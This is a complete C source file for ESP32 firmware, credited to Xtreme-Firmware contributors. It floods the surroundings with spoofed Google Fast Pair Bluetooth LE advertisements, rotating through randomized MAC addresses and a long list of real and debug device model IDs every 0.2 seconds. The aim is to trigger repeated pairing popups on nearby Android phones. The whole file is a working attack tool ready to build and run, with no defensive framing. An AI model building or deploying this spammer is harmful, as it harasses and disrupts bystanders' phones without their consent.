/*
 * ESP32 Fast Pair Knockr by Danct12
 * 
 * based on work by Willy-JL, Spooks4576, xAstroBoy, Spooks4576, DiamondRoPlayz (and others)
 * from Xtreme-Firmware: https://github.com/Flipper-XFW/Xtreme-Firmware
 *
 * SPDX-License-Identifier: GPL-3.0
 */

#include <stdio.h>
#include <inttypes.h>
#include "sdkconfig.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "esp_random.h"
#include "nvs_flash.h"

#include "esp_bt.h"
#include "esp_bt_defs.h"
#include "esp_bt_main.h"
#include "esp_gap_ble_api.h"

// Uncomment this if you only want debug devices (not interesting for non-debuggers)
//#define DEBUG_DEVICES_ONLY

// Delay (can be changed to however you like)
#define DELAY_SECONDS 0.2

esp_ble_adv_params_t ble_params = {
    .adv_int_min        = 0x20,
    .adv_int_max        = 0x40,
    .adv_type           = ADV_TYPE_IND,
    .own_addr_type      = BLE_ADDR_TYPE_RANDOM,
    .channel_map        = ADV_CHNL_ALL,
    .adv_filter_policy  = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
    .peer_addr          = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69},
    .peer_addr_type     = BLE_ADDR_TYPE_PUBLIC
};

const uint32_t models[] = {
#ifdef DEBUG_DEVICES_ONLY
    // Custom debug popups
    0xD99CA1,  // Flipper Zero"
    0x77FF67,  // Free Robux"
    0xAA187F,  // Free VBucks"
    0xDCE9EA,  // Rickroll"
    0x87B25F,  // Animated Rickroll"
    0xF38C02,  // Boykisser"
    0x1448C9,  // BLM"
    0xD5AB33,  // Xtreme"
    0x0C0B67,  // Xtreme Cta"
    0x13B39D,  // Talking Sasquach"
    0xAA1FE1,  // ClownMaster"
    0x7C6CDB,  // Obama"
    0x005EF9,  // Ryanair"
    0xE2106F,  // FBI"
    0xB37A62,  // Tesla"
#else
    // Genuine non-production/forgotten (good job Google)
    0x0001F0,  // Bisto CSR8670 Dev Board
    0x000047,  // Arduino 101
    0x470000,  // Arduino 101 2
    0x00000A,  // Anti-Spoof Test
    0x0A0000,  // Anti-Spoof Test 2
    0x00000B,  // Google Gphones
    0x0B0000,  // Google Gphones 2
    0x0C0000,  // Google Gphones 3
    0x00000D,  // Test 00000D
    0x000007,  // Android Auto
    0x070000,  // Android Auto 2
    0x000008,  // Foocorp Foophones
    0x080000,  // Foocorp Foophones 2
    0x000009,  // Test Android TV
    0x090000,  // Test Android TV 2
    0x000035,  // Test 000035
    0x350000,  // Test 000035 2
    0x000048,  // Fast Pair Headphones
    0x480000,  // Fast Pair Headphones 2
    0x000049,  // Fast Pair Headphones 3
    0x490000,  // Fast Pair Headphones 4
    0x001000,  // LG HBS1110
    0x00B727,  // Smart Controller 1
    0x01E5CE,  // BLE-Phone
    0x0200F0,  // Goodyear
    0x00F7D4,  // Smart Setup
    0xF00002,  // Goodyear
    0xF00400,  // T10
    0x1E89A7,  // ATS2833_EVB

    // Phone setup
    0x00000C,  // Google Gphones Transfer
    0x0577B1,  // Galaxy S23 Ultra
    0x05A9BC,  // Galaxy S20+

    // Genuine devices
    0xCD8256,  // Bose NC 700
    0x0000F0,  // Bose QuietComfort 35 II
    0xF00000,  // Bose QuietComfort 35 II 2
    0x821F66,  // JBL Flip 6
    0xF52494,  // JBL Buds Pro
    0x718FA4,  // JBL Live 300TWS
    0x0002F0,  // JBL Everest 110GA
    0x92BBBD,  // Pixel Buds
    0x000006,  // Google Pixel buds
    0x060000,  // Google Pixel buds 2
    0xD446A7,  // Sony XM5
    0x2D7A23,  // Sony WF-1000XM4
    0x0E30C3,  // Razer Hammerhead TWS
    0x72EF8D,  // Razer Hammerhead TWS X
    0x72FB00,  // Soundcore Spirit Pro GVA
    0x0003F0,  // LG HBS-835S
    0x002000,  // AIAIAI TMA-2 (H60)
    0x003000,  // Libratone Q Adapt On-Ear
    0x003001,  // Libratone Q Adapt On-Ear 2
    0x00A168,  // boAt  Airdopes 621
    0x00AA48,  // Jabra Elite 2
    0x00AA91,  // Beoplay E8 2.0
    0x00C95C,  // Sony WF-1000X
    0x01EEB4,  // WH-1000XM4
    0x02AA91,  // B&O Earset
    0x01C95C,  // Sony WF-1000X
    0x02D815,  // ATH-CK1TW
    0x035764,  // PLT V8200 Series
    0x038CC7,  // JBL TUNE760NC
    0x02DD4F,  // JBL TUNE770NC
    0x02E2A9,  // TCL MOVEAUDIO S200
    0x035754,  // Plantronics PLT_K2
    0x02C95C,  // Sony WH-1000XM2
    0x038B91,  // DENON AH-C830NCW
    0x02F637,  // JBL LIVE FLEX
    0x02D886,  // JBL REFLECT MINI NC
    0xF00000,  // Bose QuietComfort 35 II
    0xF00001,  // Bose QuietComfort 35 II
    0xF00201,  // JBL Everest 110GA
    0xF00204,  // JBL Everest 310GA
    0xF00209,  // JBL LIVE400BT
    0xF00205,  // JBL Everest 310GA
    0xF00200,  // JBL Everest 110GA
    0xF00208,  // JBL Everest 710GA
    0xF00207,  // JBL Everest 710GA
    0xF00206,  // JBL Everest 310GA
    0xF0020A,  // JBL LIVE400BT
    0xF0020B,  // JBL LIVE400BT
    0xF0020C,  // JBL LIVE400BT
    0xF00203,  // JBL Everest 310GA
    0xF00202,  // JBL Everest 110GA
    0xF00213,  // JBL LIVE650BTNC
    0xF0020F,  // JBL LIVE500BT
    0xF0020E,  // JBL LIVE500BT
    0xF00214,  // JBL LIVE650BTNC
    0xF00212,  // JBL LIVE500BT
    0xF0020D,  // JBL LIVE400BT
    0xF00211,  // JBL LIVE500BT
    0xF00215,  // JBL LIVE650BTNC
    0xF00210,  // JBL LIVE500BT
    0xF00305,  // LG HBS-1500
    0xF00304,  // LG HBS-1010
    0xF00308,  // LG HBS-1125
    0xF00303,  // LG HBS-930
    0xF00306,  // LG HBS-1700
    0xF00300,  // LG HBS-835S
    0xF00309,  // LG HBS-2000
    0xF00302,  // LG HBS-830
    0xF00307,  // LG HBS-1120
    0xF00301,  // LG HBS-835
    0xF00E97,  // JBL VIBE BEAM
    0x04ACFC,  // JBL WAVE BEAM
    0x04AA91,  // Beoplay H4
    0x04AFB8,  // JBL TUNE 720BT
    0x05A963,  // WONDERBOOM 3
    0x05AA91,  // B&O Beoplay E6
    0x05C452,  // JBL LIVE220BT
    0x05C95C,  // Sony WI-1000X
    0x0602F0,  // JBL Everest 310GA
    0x0603F0,  // LG HBS-1700
    0x1E8B18,  // SRS-XB43
    0x1E955B,  // WI-1000XM2
    0x1EC95C,  // Sony WF-SP700N
    0x1ED9F9,  // JBL WAVE FLEX
    0x1EE890,  // ATH-CKS30TW WH
    0x1EEDF5,  // Teufel REAL BLUE TWS 3
    0x1F1101,  // TAG Heuer Calibre E4 45mm
    0x1F181A,  // LinkBuds S
    0x1F2E13,  // Jabra Elite 2
    0x1F4589,  // Jabra Elite 2
    0x1F4627,  // SRS-XG300
    0x1F5865,  // boAt Airdopes 441
    0x1FBB50,  // WF-C700N
    0x1FC95C,  // Sony WF-SP700N
    0x1FE765,  // TONE-TF7Q
    0x1FF8FA,  // JBL REFLECT MINI NC
    0x201C7C,  // SUMMIT
    0x202B3D,  // Amazfit PowerBuds
    0x20330C,  // SRS-XB33
    0x003B41,  // M&D MW65
    0x003D8A,  // Cleer FLOW II
    0x005BC3,  // Panasonic RP-HD610N
    0x008F7D,  // soundcore Glow Mini
    0x00FA72,  // Pioneer SE-MS9BN
    0x0100F0,  // Bose QuietComfort 35 II
    0x011242,  // Nirvana Ion
    0x013D8A,  // Cleer EDGE Voice
    0x01AA91,  // Beoplay H9 3rd Generation
    0x038F16,  // Beats Studio Buds
    0x039F8F,  // Michael Kors Darci 5e
    0x03AA91,  // B&O Beoplay H8i
    0x03B716,  // YY2963
    0x03C95C,  // Sony WH-1000XM2
    0x03C99C,  // MOTO BUDS 135
    0x03F5D4,  // Writing Account Key
    0x045754,  // Plantronics PLT_K2
    0x045764,  // PLT V8200 Series
    0x04C95C,  // Sony WI-1000X
    0x050F0C,  // Major III Voice
    0x052CC7,  // MINOR III
    0x057802,  // TicWatch Pro 5
    0x0582FD,  // Pixel Buds
    0x058D08,  // WH-1000XM4
    0x06AE20,  // Galaxy S21 5G
    0x06C197,  // OPPO Enco Air3 Pro
    0x06C95C,  // Sony WH-1000XM2
    0x06D8FC,  // soundcore Liberty 4 NC
    0x0744B6,  // Technics EAH-AZ60M2
    0x07A41C,  // WF-C700N
    0x07C95C,  // Sony WH-1000XM2
    0x07F426,  // Nest Hub Max
    0x0102F0,  // JBL Everest 110GA - Gun Metal
    0x0202F0,  // JBL Everest 110GA - Silver
    0x0302F0,  // JBL Everest 310GA - Brown
    0x0402F0,  // JBL Everest 310GA - Gun Metal
    0x0502F0,  // JBL Everest 310GA - Silver
    0x0702F0,  // JBL Everest 710GA - Gun Metal
    0x0802F0,  // JBL Everest 710GA - Silver
    0x054B2D,  // JBL TUNE125TWS
    0x0660D7,  // JBL LIVE770NC
    0x0103F0,  // LG HBS-835
    0x0203F0,  // LG HBS-830
    0x0303F0,  // LG HBS-930
    0x0403F0,  // LG HBS-1010
    0x0503F0,  // LG HBS-1500
    0x0703F0,  // LG HBS-1120
    0x0803F0,  // LG HBS-1125
    0x0903F0,  // LG HBS-2000
#endif
};

uint8_t bt_packets[14] = {
    0x3,              // Size
    0x03,             // AD Type (Service UUID List)
    0x2C, 0xFE,       // Service UUID (Google LLC, FastPair)

    0x6,              // Size
    0x16,             // AD Type (Service Data)
    0x2C, 0xFE,       // Service UUID (Google LLC, FastPair)
    0x00, 0x00, 0x00, // Model ID
    
    0x2,              // Size
    0x0A,             // AD Type (Tx Power Level)
    0x00              // -100 to +20 dBm (will be filled later)
};

static const char* TAG = "FastPairKnockr";

void app_main(void)
{
    printf("ESP32 Fast Pair Knockr by Danct12\n");
    printf("based on work by Willy-JL, Spooks4576 ,xAstroBoy, Spooks4576, DiamondRoPlayz (and others)\nfrom Xtreme-Firmware: https://github.com/Flipper-XFW/Xtreme-Firmware\n\n");
    printf("IRC: irc.oftc.net - #postmarketos-offtopic - Port: 6667 / 6697 (TLS)\n");

    ESP_LOGI(TAG, "Initializing BLE stack..\n");
    
    ESP_ERROR_CHECK(nvs_flash_init());
    esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);
    
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_bt_controller_init(&bt_cfg));
    ESP_ERROR_CHECK(esp_bt_controller_enable(ESP_BT_MODE_BLE));
    ESP_ERROR_CHECK(esp_bluedroid_init());
    ESP_ERROR_CHECK(esp_bluedroid_enable());
    
    ESP_LOGI(TAG, "Done. GO GO GO.\n");
    
    while (true) {
        for (int i = 0; i < 6; i++){
            ble_params.peer_addr[i] = esp_random() % 256;
            
            if (i == 0){
                ble_params.peer_addr[i] |= 0xF0;
            }
        }
        ESP_LOGD(TAG, "BT_ADDR: %02X:%02X:%02X:%02X:%02X:%02X",
                ble_params.peer_addr[0], ble_params.peer_addr[1], ble_params.peer_addr[2], ble_params.peer_addr[3], ble_params.peer_addr[4], ble_params.peer_addr[5]);
        ESP_ERROR_CHECK(esp_ble_gap_set_rand_addr(ble_params.peer_addr));
        int index = esp_random() % (sizeof(models) / sizeof(models[0]));

        bt_packets[8]  = (models[index] >> 0x10) & 0xFF;
        bt_packets[9]  = (models[index] >> 0x08) & 0xFF;
        bt_packets[10] = (models[index] >> 0x00) & 0xFF;
        
        // Set TX Power
        bt_packets[13] = (rand() % 120) - 100;

        ESP_LOGD(TAG, "BT_ADV: 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X",
                bt_packets[0], bt_packets[1], bt_packets[2], bt_packets[3], bt_packets[4], bt_packets[5],
                bt_packets[6], bt_packets[7], bt_packets[8], bt_packets[9], bt_packets[10], bt_packets[11],
                bt_packets[12], bt_packets[13]);
        ESP_LOGD(TAG, "End.");

        ESP_ERROR_CHECK(esp_ble_gap_config_adv_data_raw(bt_packets, 11));
        ESP_LOGI(TAG, "Sending advertisement packets...");
        ESP_ERROR_CHECK(esp_ble_gap_start_advertising(&ble_params));
        vTaskDelay((DELAY_SECONDS * 1000) / portTICK_PERIOD_MS);
        ESP_ERROR_CHECK(esp_ble_gap_stop_advertising());
    }

    return;
}
